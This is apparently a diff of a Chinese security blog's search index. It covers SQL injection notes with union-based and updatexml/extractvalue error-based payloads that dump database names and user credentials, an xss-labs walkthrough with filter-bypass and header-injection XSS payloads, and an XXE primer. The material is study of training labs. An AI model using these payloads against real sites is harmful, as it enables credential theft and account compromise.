+<p>博客-漏洞较少</p>
+<p>第三方-功能决定</p>
+<h2 id="4-其他补充"><a href="#4-其他补充" class="headerlink" title="4.其他补充"></a>4.其他补充</h2><p>框架或非框架-框架漏洞或代码漏洞</p>
+<p>CMS识别-即是否套用了模板</p>
+<p>开源-找漏洞和审计</p>
+<p>内部-渗透测试</p>
+<p>源码获取-搜索&#x2F;淘宝&#x2F;github</p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+      </categories>
+      <tags>
+        <tag>Web源码拓展</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sql注入-tips</title>
     <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/</url>
     <content><![CDATA[<h2 id="爆破语句"><a href="#爆破语句" class="headerlink" title="爆破语句"></a>爆破语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段</span><br></pre></td></tr></table></figure>
@@ -788,33 +1046,6 @@ return $outText;#新值
         <tag>注入绕过</tag>
         <tag>sql注入技巧</tag>
         <tag>sql注入防御</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入之报错注入</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
-<p><strong>extravtvalue()</strong></p>
-<p>floor()、rand()…主键重复方式，暂时不展开</p>
-<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
-<blockquote>
-<p>XML_document:是字符串String格式，为XML文档对象名称</p>
-<p>Xpath_string:Xpath格式的字符串</p>
-<p>new_value:string格式，替换查找到的符合条件的数据</p>
-</blockquote>
-<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>报错注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1022,37 +1253,114 @@ echo $get
       </tags>
   </entry>
   <entry>
-    <title>sql注入之联合注入</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
-<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们后面要对字段数进行判断。</p>
-<p>mysql中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。</p>
-<p>1、    判断注入点</p>
-<p>假如存在这么一个参数?id&#x3D;1，可以在参数后面加个单引号或者双引号看是否爆sql语法的错误</p>
-<p>2、    判断<strong>闭合</strong>形式</p>
-<p>主要是判断是否是<strong>整形</strong>闭合，还是字符型闭合，如果是字符型闭合 ，又看是否是<strong>单引</strong>号闭合、双引号闭合，或者是<strong>引号加括号</strong>的闭合形式。</p>
-<p>3、判断查询列数</p>
-<p>1’ order by 1–+</p>
-<p>当order by 3时排序第三个栏位回显正常，而order by 4回显错误，可以判断出当前sql语句向该表查询了三个字段。所以说orderby只是判断了当前sql语句查询的字段数，并不是判断Users表中有几个列，目的是为了符合union的用法，即有相同的字段数。</p>
-<p>4、判断显示位</p>
-<p>对于一个网页，如果它的列数有三列，但可能只有1，2列的数据返回页面前端。所以我们需要查询哪个列会回显，得用unionselect 1,2,3来查看回显位。</p>
-<p>常用语句为-1’ union select 1,2,3–+</p>
-<p>这里一定得是-1 union……，而不是1 union…..因为程序在展示数据的时候通常只会取结果集的第一行数据，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
-<p>只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p>
-<p>5、获取所有数据库名</p>
-<p>6、获取数据库所有表名</p>
-<p>7、获取字段名 </p>
-<p>8、获取字段中的数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>
+    <title>xss-labs</title>
+    <url>/2023/05/17/xss-labs/</url>
+    <content><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><p>phpstudy</p>
+<h2 id="二、内容"><a href="#二、内容" class="headerlink" title="二、内容"></a>二、内容</h2><h3 id="1-level1"><a href="#1-level1" class="headerlink" title="1.level1"></a>1.level1</h3><p>url中添加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;11&quot;)&lt;/script&gt;即可</span><br></pre></td></tr></table></figure>
 
-<p>参考：<a href="https://blog.csdn.net/qq_61237064/article/details/121758528?ops_request_misc=%7B%22request_id%22:%22168049213216800211546816%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168049213216800211546816&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-121758528-null-null.142%5Ev80%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">sql注入中的联合注入_ZredamanJ的博客-CSDN博客</a></p>
+<h3 id="2-level2-html实体化-lt-gt"><a href="#2-level2-html实体化-lt-gt" class="headerlink" title="2.level2(html实体化&lt;&gt;)"></a>2.level2(html实体化&lt;&gt;)</h3><p>输入level1中的值，发现&lt;&gt;被实体化了。</p>
+<p>构造input闭合</p>
+<p><code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
+<h3 id="3-level3-html实体化”-lt-gt"><a href="#3-level3-html实体化”-lt-gt" class="headerlink" title="3.level3(html实体化”&lt;&gt;)"></a>3.level3(html实体化”&lt;&gt;)</h3><p>经过试验单引号不会被转义</p>
+<p>构造onmouseover事件，即鼠标触碰到input标签即还行该事件</p>
+<p><code>&#39; onmouseover=javascript:alert(1) &#39;</code></p>
+<h3 id="4-level4-html实体化’-lt-gt"><a href="#4-level4-html实体化’-lt-gt" class="headerlink" title="4.level4(html实体化’&lt;&gt;)"></a>4.level4(html实体化’&lt;&gt;)</h3><p>很好，单引号、尖括号没了</p>
+<p><code>&quot; onmouseover=javascript:alert(1) &quot;</code></p>
+<h3 id="5-level5-伪协议"><a href="#5-level5-伪协议" class="headerlink" title="5.level5(伪协议)"></a>5.level5(伪协议)</h3><p>script、onmouserover等中间会加个_符号</p>
+<p>知识点：伪协议：在url中调用js方法，如Data伪协议与Javascript协议</p>
+<p><code>&quot;&gt;&lt;a href=javascript:alert(&quot;123&quot;)&gt;&quot;</code></p>
+<p>点击链接跳转即可</p>
+<p>参考：<a href="https://blog.csdn.net/qq_33181292/article/details/117251090?ops_request_misc=&request_id=&biz_id=102&utm_term=xss%E4%BC%AA%E5%8D%8F%E8%AE%AE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-117251090.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">XSS_伪协议与编码绕过_伪协议绕过_南部余额的博客-CSDN博客</a></p>
+<p>​		<a href="https://blog.csdn.net/K_ShenH/article/details/122765092?ops_request_misc=%7B%22request_id%22:%22168440472216800197061493%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168440472216800197061493&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122765092-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss-labs&spm=1018.2226.3001.4187">xss-labs搭建及通关攻略_Lydia_Ha的博客-CSDN博客</a></p>
+<h3 id="6-level6-小写过滤"><a href="#6-level6-小写过滤" class="headerlink" title="6.level6(小写过滤)"></a>6.level6(小写过滤)</h3><p>在script的基础上，href、src、oneerror什么的中间也加符号了</p>
+<p>但没有大写过滤</p>
+<p><code>&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p>
+<h3 id="7-level7-标签名过滤"><a href="#7-level7-标签名过滤" class="headerlink" title="7.level7(标签名过滤)"></a>7.level7(标签名过滤)</h3><p>src啊,&lt;&gt;script啊都被删了、on啊</p>
+<p>双写绕过</p>
+<p><code>&quot;&gt;&lt;SCRscriptIPT&gt;alert(1)&lt;/SCRscriptIPT&gt;</code></p>
+<h3 id="8-level8-unicode编码"><a href="#8-level8-unicode编码" class="headerlink" title="8.level8(unicode编码)"></a>8.level8(unicode编码)</h3><p>它把输入框的值放在了a标签的href里</p>
+<p>scr字符后面会放_符号，且大写会被转化为小写</p>
+<p>引号也实体化了</p>
+<p>将代码进行unicode编码即可</p>
+<p>如<code>javascript:alert(1)</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
+<h3 id="level9-继续过滤"><a href="#level9-继续过滤" class="headerlink" title="level9(继续过滤)"></a>level9(继续过滤)</h3><p>还是把输入框的值放在了a标签的href里，但是unicode编码不能用咯</p>
+<p>知识点:strpos()查找字符串在另一字符串中第一次出现的位置。</p>
+<p>源码有strpos函数过滤，限制输入内容必须有http:&#x2F;&#x2F;</p>
+<p><code>javas&amp;#99;ript:alert(&#39;http://123&#39;)</code></p>
+<p>部分源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level10-隐藏参数"><a href="#level10-隐藏参数" class="headerlink" title="level10(隐藏参数)"></a>level10(隐藏参数)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>url被符号实体化了。</p>
+<p>从t_sort输入框下手，仅仅替换了尖括号。</p>
+<p>给input加一个onclick事件</p>
+<p>如<code>onclick=alert(1)</code></p>
+<p>记得去掉type的hide属性</p>
+<h3 id="level11-Referer"><a href="#level11-Referer" class="headerlink" title="level11(Referer)"></a>level11(Referer)</h3><p>同level10</p>
+<p>但是应该不对，怎么会有同一种解法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第四行明显是说Reffer</p>
+<p>bp时</p>
+<p><code>Referer:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520113437383.png" alt="image-20230520113437383"></p>
+<h3 id="level12（代理）"><a href="#level12（代理）" class="headerlink" title="level12（代理）"></a>level12（代理）</h3><p>f12，看得t_ua</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>bp时，很明显是</p>
+<p><code>User-Agent:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
+<h3 id="level13-Cookie"><a href="#level13-Cookie" class="headerlink" title="level13(Cookie)"></a>level13(Cookie)</h3><p>f12，看到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这应该提示了cookie</p>
+<p>bp试试</p>
+<p><code>Cookie: user=&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
+<h3 id="level14-exif"><a href="#level14-exif" class="headerlink" title="level14(exif)"></a>level14(exif)</h3><p>待解决</p>
+<h3 id="level15-ngInclude"><a href="#level15-ngInclude" class="headerlink" title="level15(ngInclude)"></a>level15(ngInclude)</h3><p>url:</p>
+<p><code>http://localhost:81/xss-labs/level15.php?src=1.gif</code></p>
+<p>f12出现这个：</p>
+<p><img src="/../../../Typora/img111/image-20230520133632333.png" alt="image-20230520133632333"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>知识点：ng-include</p>
+<p>ng-include是angular js的东西，类似php函数中的include函数，即包含文件。</p>
+<p>1、ng-include 指令用于包含外部的 HTML文件。</p>
+<p>2、包含的内容将作为指定元素的子节点。</p>
+<p>3、ng-include 属性的值可以是一个表达式，返回一个文件名。</p>
+<p>4、默认情况下，包含的文件需要包含在同一个域名下。</p>
+<p>值得注意的是：</p>
+<p>ng-include,如果单纯指定地址，必须要加引号</p>
+<p>ng-include,加载外部html，script标签中的内容不执行</p>
+<p>ng-include,加载外部html中含有style标签样式可以识别<br>参考：<a href="https://blog.csdn.net/RuoLi_s/article/details/112690177?ops_request_misc=&request_id=&biz_id=102&utm_term=xss-labs%E9%80%9A%E5%85%B3&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-112690177.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187">xss-labs通关挑战（xss challenge）_RuoLi_s的博客-CSDN博客</a></p>
+<p>把其他存在xss漏洞的文件包含进来。</p>
+<p><code>src=&#39;level1.php?name=&lt;a href=javascript:alert(1)&gt;&#39;</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520135939252.png" alt="image-20230520135939252"></p>
+<h3 id="level16-空格绕过"><a href="#level16-空格绕过" class="headerlink" title="level16(空格绕过)"></a>level16(空格绕过)</h3><p>源代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>主要是script替换了，空格实体化了，”&#x2F;“也没了</p>
+<p>试试img，并且替换个空格</p>
+<p>%0a试试。</p>
+<p><code>keyword=</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520142552842.png" alt="image-20230520142552842"></p>
+<h3 id="level17-18-参数拼接"><a href="#level17-18-参数拼接" class="headerlink" title="level17-18(参数拼接)"></a>level17-18(参数拼接)</h3><p>url两个参数，中间有&#x3D;</p>
+<p><code>arg01=%20onmouseover&amp;arg02=alert(1)</code></p>
+<p>onmouseover前加个空格</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520154125903.png" alt="image-20230520154125903"></p>
+<p>level18同理。</p>
+<h3 id="level19-20-Flash反编译"><a href="#level19-20-Flash反编译" class="headerlink" title="level19-20(Flash反编译)"></a>level19-20(Flash反编译)</h3><p>待解决</p>
 ]]></content>
       <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
+        <category>xss</category>
       </categories>
       <tags>
-        <tag>联合注入</tag>
+        <tag>漏洞</tag>
+        <tag>xss</tag>
       </tags>
   </entry>
   <entry>
@@ -1207,147 +1515,84 @@ echo $get
       </tags>
   </entry>
   <entry>
-    <title>xss-labs</title>
-    <url>/2023/05/17/xss-labs/</url>
-    <content><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><p>phpstudy</p>
-<h2 id="二、内容"><a href="#二、内容" class="headerlink" title="二、内容"></a>二、内容</h2><h3 id="1-level1"><a href="#1-level1" class="headerlink" title="1.level1"></a>1.level1</h3><p>url中添加</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;11&quot;)&lt;/script&gt;即可</span><br></pre></td></tr></table></figure>
+    <title>xxe与xml</title>
+    <url>/2023/05/30/xxe%E4%B8%8Exml/</url>
+    <content><![CDATA[<h3 id="1-参考"><a href="#1-参考" class="headerlink" title="1.参考"></a>1.参考</h3><p><a href="https://xz.aliyun.com/t/12325">对于XXE的理解 - 先知社区 (aliyun.com)</a></p>
+<p><a href="http://t.csdn.cn/zUo5a">http://t.csdn.cn/zUo5a</a></p>
+<h3 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2.前置知识"></a>2.前置知识</h3><p>xml被设计为<strong>传输和存储数据</strong>，xml文档结构包括：</p>
+<p>xml声明</p>
+<p>DTD文档类型定义(漏洞所在之处)</p>
+<p>文档元素</p>
+<p>焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
+<p>xxe（xml external entity injection），即xml外部实体注入漏洞，xxe漏洞发生在应用程序解析xml输入时，<strong>没有禁止外部实体的加载</strong>，导致加载了恶意外部文件，造成文件读取、命令执行、内网攻击、DOS攻击等危害。</p>
+<h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p>没有禁止外部实体解析</p>
+<h4 id="xml与html主要差异"><a href="#xml与html主要差异" class="headerlink" title="xml与html主要差异"></a>xml与html主要差异</h4><p>xml被设计为传输和存储数据，焦点是数据的内容；</p>
+<p>html被设计用来显示数据，焦点是数据的外观；</p>
+<p>html旨在显示信息，而xml旨在传输信息。</p>
+<h4 id="xml文档"><a href="#xml文档" class="headerlink" title="xml文档"></a>xml文档</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">第一部分：XML声明部分</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"> </span><br><span class="line">第二部分：文档类型定义 DTD</span><br><span class="line"><span class="comment">&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>[ </span></span><br><span class="line"><span class="meta">  &lt;!--定义 note 元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  &lt;!--定义 to 元素为 &quot;#PCDATA&quot; 类型--&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>      (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">from</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">body</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!--外部实体声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;!-- 形如: <span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> <span class="string">&quot;文件名&quot;</span>&gt;</span> --&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">entity-name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;URI/URL&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> </span><br><span class="line">第三部分：文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「angry_program」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span 